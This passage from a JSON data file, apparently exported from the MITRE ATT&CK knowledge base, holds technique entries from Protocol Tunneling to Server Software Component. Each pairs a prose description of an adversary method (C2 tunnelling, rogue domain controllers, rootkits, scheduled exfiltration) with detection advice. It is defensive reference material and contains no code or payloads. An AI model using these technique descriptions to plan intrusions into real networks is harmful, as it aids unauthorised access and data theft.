                "description": "Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. \n\nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.(Citation: SSH Tunneling) \n\n[Protocol Tunneling](https://attack.mitre.org/techniques/T1572) may also be abused by adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568). Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua JUL19) \n\nAdversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Protocol Impersonation](https://attack.mitre.org/techniques/T1001/003) to further conceal C2 communications and infrastructure. ",
                "url": "https://attack.mitre.org/techniques/T1572",
                "data_sources": [
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Connection Creation",
                    "Network Traffic: Network Traffic Content"
                ],
                "detection": "Monitoring for systems listening and/or establishing external connections using ports/protocols commonly associated with tunneling, such as SSH (port 22). Also monitor for processes commonly associated with tunneling, such as Plink and the OpenSSH client. \n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "command-and-control"
                ]
            },
            {
                "id": "T1090",
                "name": "Proxy",
                "description": "Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\n\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.",
                "url": "https://attack.mitre.org/techniques/T1090",
                "data_sources": [
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Connection Creation",
                    "Network Traffic: Network Traffic Content"
                ],
                "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)\n\nConsider monitoring for traffic to known anonymity networks (such as [Tor](https://attack.mitre.org/software/S0183)).",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Network"
                ],
                "tactics": [
                    "command-and-control"
                ]
            },
            {
                "id": "T1012",
                "name": "Query Registry",
                "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "url": "https://attack.mitre.org/techniques/T1012",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "Windows Registry: Windows Registry Key Access",
                    "Process: OS API Execution"
                ],
                "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nInteraction with the Windows Registry may come from the command line using utilities such as [Reg](https://attack.mitre.org/software/S0075) or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "permissions": [
                    "User",
                    "Administrator",
                    "SYSTEM"
                ],
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "discovery"
                ]
            },
            {
                "id": "T1108",
                "name": "Redundant Access",
                "description": "**This technique has been deprecated. Please use [Create Account](https://attack.mitre.org/techniques/T1136), [Web Shell](https://attack.mitre.org/techniques/T1505/003), and [External Remote Services](https://attack.mitre.org/techniques/T1133) where appropriate.**\n\nAdversaries may use more than one remote access tool with varying command and control protocols or credentialed access to remote services so they can maintain access if an access mechanism is detected or mitigated. \n\nIf one type of tool is detected and blocked or removed as a response but the organization did not gain a full understanding of the adversary's tools and access, then the adversary will be able to retain access to the network. Adversaries may also attempt to gain access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use [External Remote Services](https://attack.mitre.org/techniques/T1133) such as external VPNs as a way to maintain access despite interruptions to remote access tools deployed within a target network.(Citation: Mandiant APT1) Adversaries may also retain access through cloud-based infrastructure and applications.\n\nUse of a [Web Shell](https://attack.mitre.org/techniques/T1100) is one such way to maintain access to a network through an externally accessible Web server.",
                "url": "https://attack.mitre.org/techniques/T1108",
                "detection": "Existing methods of detecting remote access tools are helpful. Backup remote access tools or other access points may not have established command and control channels open during an intrusion, so the volume of data transferred may not be as high as the primary channel unless access is lost.\n\nDetection of tools based on beacon traffic, Command and Control protocol, or adversary infrastructure require prior threat intelligence on tools, IP addresses, and/or domains the adversary may use, along with the ability to detect use at the network boundary. Prior knowledge of indicators of compromise may also help detect adversary tools at the endpoint if tools are available to scan for those indicators.\n\nIf an intrusion is in progress and sufficient endpoint data or decoded command and control traffic is collected, then defenders will likely be able to detect additional tools dropped as the adversary is conducting the operation.\n\nFor alternative access using externally accessible VPNs or remote services, follow detection recommendations under [Valid Accounts](https://attack.mitre.org/techniques/T1078) and [External Remote Services](https://attack.mitre.org/techniques/T1133) to collect account use information.",
                "permissions": [
                    "User",
                    "Administrator",
                    "SYSTEM"
                ],
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS"
                ],
                "tactics": [
                    "defense-evasion",
                    "persistence"
                ]
            },
            {
                "id": "T1219",
                "name": "Remote Access Software",
                "description": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n\nRemote access tools may be established and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.\n\nAdmin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns. (Citation: CrowdStrike 2015 Global Threat Report) (Citation: CrySyS Blog TeamSpy)",
                "url": "https://attack.mitre.org/techniques/T1219",
                "data_sources": [
                    "Process: Process Creation",
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Connection Creation",
                    "Network Traffic: Network Traffic Content"
                ],
                "detection": "Monitor for applications and processes related to remote admin tools. Correlate activity with other suspicious behavior that may reduce false positives if these tools are used by legitimate users and administrators.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.\n\n[Domain Fronting](https://attack.mitre.org/techniques/T1090/004) may be used in conjunction to avoid defenses. Adversaries will likely need to deploy and/or install these remote tools to compromised systems. It may be possible to detect or prevent the installation of these tools with host-based solutions.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ],
                "tactics": [
                    "command-and-control"
                ]
            },
            {
                "id": "T1563",
                "name": "Remote Service Session Hijacking",
                "description": "Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.\n\nAdversaries may commandeer these sessions to carry out actions on remote systems. [Remote Service Session Hijacking](https://attack.mitre.org/techniques/T1563) differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021) because it hijacks an existing session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: RDP Hijacking Medium)(Citation: Breach Post-mortem SSH Hijack)",
                "url": "https://attack.mitre.org/techniques/T1563",
                "data_sources": [
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Traffic Content",
                    "Logon Session: Logon Session Creation",
                    "Command: Command Execution",
                    "Process: Process Creation"
                ],
                "detection": "Use of these services may be legitimate, depending upon the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with that service. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.\n\nMonitor for processes and command-line arguments associated with hijacking service sessions.",
                "permissions": [
                    "SYSTEM",
                    "root"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "lateral-movement"
                ]
            },
            {
                "id": "T1021",
                "name": "Remote Services",
                "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.\n\nIn an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop Services)",
                "url": "https://attack.mitre.org/techniques/T1021",
                "data_sources": [
                    "Process: Process Creation",
                    "Network Traffic: Network Connection Creation",
                    "Network Traffic: Network Traffic Flow",
                    "Logon Session: Logon Session Creation",
                    "Command: Command Execution",
                    "Network Share: Network Share Access",
                    "Module: Module Load"
                ],
                "detection": "Correlate use of login activity related to remote services with unusual behavior or other malicious or suspicious activity. Adversaries will likely need to learn about an environment and the relationships between systems through Discovery techniques prior to attempting Lateral Movement.",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "lateral-movement"
                ]
            },
            {
                "id": "T1018",
                "name": "Remote System Discovery",
                "description": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097) or <code>net view</code> using [Net](https://attack.mitre.org/software/S0039). Adversaries may also use local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) in order to discover the hostname to IP address mappings of remote systems. \n\nSpecific to macOS, the <code>bonjour</code> protocol exists to discover additional Mac-based systems within the same broadcast domain.",
                "url": "https://attack.mitre.org/techniques/T1018",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "Network Traffic: Network Connection Creation",
                    "File: File Access"
                ],
                "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nMonitor for processes that can be used to discover remote systems, such as <code>ping.exe</code> and <code>tracert.exe</code>, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)",
                "permissions": [
                    "User",
                    "Administrator",
                    "SYSTEM"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "discovery"
                ]
            },
            {
                "id": "T1091",
                "name": "Replication Through Removable Media",
                "description": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.",
                "url": "https://attack.mitre.org/techniques/T1091",
                "data_sources": [
                    "Process: Process Creation",
                    "File: File Access",
                    "File: File Creation",
                    "Drive: Drive Creation"
                ],
                "detection": "Monitor file access on removable media. Detect processes that execute from removable media after it is mounted or when initiated by a user. If a remote access tool is used in this manner to move laterally, then additional actions are likely to occur after execution, such as opening network connections for Command and Control and system and network information Discovery.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "lateral-movement",
                    "initial-access"
                ]
            },
            {
                "id": "T1496",
                "name": "Resource Hijacking",
                "description": "Adversaries may leverage the resources of co-opted systems in order to solve resource intensive problems which may impact system and/or hosted service availability. \n\nOne common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.(Citation: Kaspersky Lazarus Under The Hood Blog 2017) Servers and cloud-based(Citation: CloudSploit - Unused AWS Regions) systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Resource Hijacking and cryptocurrency mining. Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.(Citation: Unit 42 Hildegard Malware)(Citation: Trend Micro Exposed Docker APIs)\n\nAdditionally, some cryptocurrency mining malware kills off processes for competing malware to ensure it�s not competing for resources.(Citation: Trend Micro War of Crypto Miners)",
                "url": "https://attack.mitre.org/techniques/T1496",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "File: File Creation",
                    "Network Traffic: Network Connection Creation",
                    "Network Traffic: Network Traffic Flow",
                    "Sensor Health: Host Status"
                ],
                "detection": "Consider monitoring process resource usage to determine anomalous activity associated with malicious hijacking of computer resources such as CPU, memory, and graphics processing resources. Monitor for suspicious use of network resources associated with cryptocurrency mining software. Monitor for common cryptomining software process names and files on local systems that may indicate compromise and resource usage.",
                "permissions": [
                    "User",
                    "Administrator"
                ],
                "platforms": [
                    "Windows",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Containers"
                ],
                "tactics": [
                    "impact"
                ]
            },
            {
                "id": "T1207",
                "name": "Rogue Domain Controller",
                "description": "Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\n\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)\n\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)",
                "url": "https://attack.mitre.org/techniques/T1207",
                "data_sources": [
                    "Active Directory: Active Directory Object Creation",
                    "Active Directory: Active Directory Object Modification",
                    "Network Traffic: Network Traffic Content",
                    "User Account: User Account Authentication"
                ],
                "detection": "Monitor and analyze network traffic associated with data replication (such as calls to DrsAddEntry, DrsReplicaAdd, and especially GetNCChanges) between DCs as well as to/from non DC hosts. (Citation: GitHub DCSYNCMonitor) (Citation: DCShadow Blog) DC replication will naturally take place every 15 minutes but can be triggered by an attacker or by legitimate urgent changes (ex: passwords). Also consider monitoring and alerting on the replication of AD objects (Audit Detailed Directory Service Replication Events 4928 and 4929). (Citation: DCShadow Blog)\n\nLeverage AD directory synchronization (DirSync) to monitor changes to directory state using AD replication cookies. (Citation: Microsoft DirSync) (Citation: ADDSecurity DCShadow Feb 2018)\n\nBaseline and periodically analyze the Configuration partition of the AD schema and alert on creation of nTDSDSA objects. (Citation: DCShadow Blog)\n\nInvestigate usage of Kerberos Service Principal Names (SPNs), especially those associated with services (beginning with �GC/�) by computers not present in the DC organizational unit (OU). The SPN associated with the Directory Replication Service (DRS) Remote Protocol interface (GUID E3514235�4B06�11D1-AB04�00C04FC2DCD2) can be set without logging. (Citation: ADDSecurity DCShadow Feb 2018) A rogue DC must authenticate as a service using these two SPNs for the replication process to successfully complete.",
                "permissions": [
                    "Administrator"
                ],
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            },
            {
                "id": "T1014",
                "name": "Rootkit",
                "description": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)",
                "url": "https://attack.mitre.org/techniques/T1014",
                "data_sources": [
                    "Drive: Drive Modification",
                    "Firmware: Firmware Modification"
                ],
                "detection": "Some rootkit protections may be built into anti-virus or operating system software. There are dedicated rootkit detection tools that look for specific types of rootkit behavior. Monitor for the existence of unrecognized DLLs, devices, services, and changes to the MBR. (Citation: Wikipedia Rootkit)",
                "permissions": [
                    "Administrator",
                    "SYSTEM",
                    "root"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            },
            {
                "id": "T1053",
                "name": "Scheduled Task/Job",
                "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security)\n\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges).",
                "url": "https://attack.mitre.org/techniques/T1053",
                "data_sources": [
                    "File: File Creation",
                    "Container: Container Creation",
                    "Scheduled Job: Scheduled Job Creation",
                    "Command: Command Execution",
                    "File: File Modification",
                    "Process: Process Creation"
                ],
                "detection": "Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. \n\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
                "permissions": [
                    "Administrator",
                    "SYSTEM",
                    "User"
                ],
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS",
                    "Containers"
                ],
                "tactics": [
                    "execution",
                    "persistence",
                    "privilege-escalation"
                ]
            },
            {
                "id": "T1029",
                "name": "Scheduled Transfer",
                "description": "Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) or [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).",
                "url": "https://attack.mitre.org/techniques/T1029",
                "data_sources": [
                    "Network Traffic: Network Connection Creation",
                    "Network Traffic: Network Traffic Flow"
                ],
                "detection": "Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious. Network connections to the same destination that occur at the same time of day for multiple days are suspicious.",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "exfiltration"
                ]
            },
            {
                "id": "T1113",
                "name": "Screen Capture",
                "description": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)\n",
                "url": "https://attack.mitre.org/techniques/T1113",
                "data_sources": [
                    "Process: OS API Execution",
                    "Command: Command Execution"
                ],
                "detection": "Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "collection"
                ]
            },
            {
                "id": "T1064",
                "name": "Scripting",
                "description": "**This technique has been deprecated. Please use [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) where appropriate.**\n\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and [PowerShell](https://attack.mitre.org/techniques/T1086) but could also be in the form of command-line batch scripts.\n\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), where adversaries will rely on macros being allowed or that the user will accept to activate them.\n\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit (Citation: Metasploit_Ref), Veil (Citation: Veil_Ref), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)",
                "url": "https://attack.mitre.org/techniques/T1064",
                "detection": "Scripting may be common on admin, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.\n\nAnalyze Office file attachments for potentially malicious macros. Execution of macros may create suspicious process trees depending on what the macro is designed to do. Office processes, such as winword.exe, spawning instances of cmd.exe, script application like wscript.exe or powershell.exe, or other suspicious processes may indicate malicious activity. (Citation: Uperesia Malicious Office Documents)",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "defense-evasion",
                    "execution"
                ]
            },
            {
                "id": "T1597",
                "name": "Search Closed Sources",
                "description": "Adversaries may search and gather information about victims from closed sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data.(Citation: D3Secutrity CTI Feeds) Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.(Citation: ZDNET Selling Data)\n\nAdversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",
                "url": "https://attack.mitre.org/techniques/T1597",
                "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",
                "platforms": [
                    "PRE"
                ],
                "tactics": [
                    "reconnaissance"
                ]
            },
            {
                "id": "T1596",
                "name": "Search Open Technical Databases",
                "description": "Adversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans.(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS)(Citation: Medium SSL Cert)(Citation: SSLShopper Lookup)(Citation: DigitalShadows CDN)(Citation: Shodan)\n\nAdversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
                "url": "https://attack.mitre.org/techniques/T1596",
                "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",
                "platforms": [
                    "PRE"
                ],
                "tactics": [
                    "reconnaissance"
                ]
            },
            {
                "id": "T1593",
                "name": "Search Open Websites/Domains",
                "description": "Adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts.(Citation: Cyware Social Media)(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)\n\nAdversaries may search in different online sites depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Phishing](https://attack.mitre.org/techniques/T1566)).",
                "url": "https://attack.mitre.org/techniques/T1593",
                "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",
                "platforms": [
                    "PRE"
                ],
                "tactics": [
                    "reconnaissance"
                ]
            },
            {
                "id": "T1594",
                "name": "Search Victim-Owned Websites",
                "description": "Adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex: [Email Addresses](https://attack.mitre.org/techniques/T1589/002)). These sites may also have details highlighting business operations and relationships.(Citation: Comparitech Leak)\n\nAdversaries may search victim-owned websites to gather actionable information. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199) or [Phishing](https://attack.mitre.org/techniques/T1566)).",
                "url": "https://attack.mitre.org/techniques/T1594",
                "data_sources": [
                    "Application Log: Application Log Content"
                ],
                "detection": "Monitor for suspicious network traffic that could be indicative of adversary reconnaissance, such as rapid successions of requests indicative of web crawling and/or large quantities of requests originating from a single source (especially if the source is known to be associated with an adversary). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.",
                "platforms": [
                    "PRE"
                ],
                "tactics": [
                    "reconnaissance"
                ]
            },
            {
                "id": "T1505",
                "name": "Server Software Component",
                "description": "Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.",
                "url": "https://attack.mitre.org/techniques/T1505",
                "data_sources": [
                    "File: File Creation",
                    "File: File Modification",
                    "Process: Process Creation",
                    "Network Traffic: Network Traffic Content",
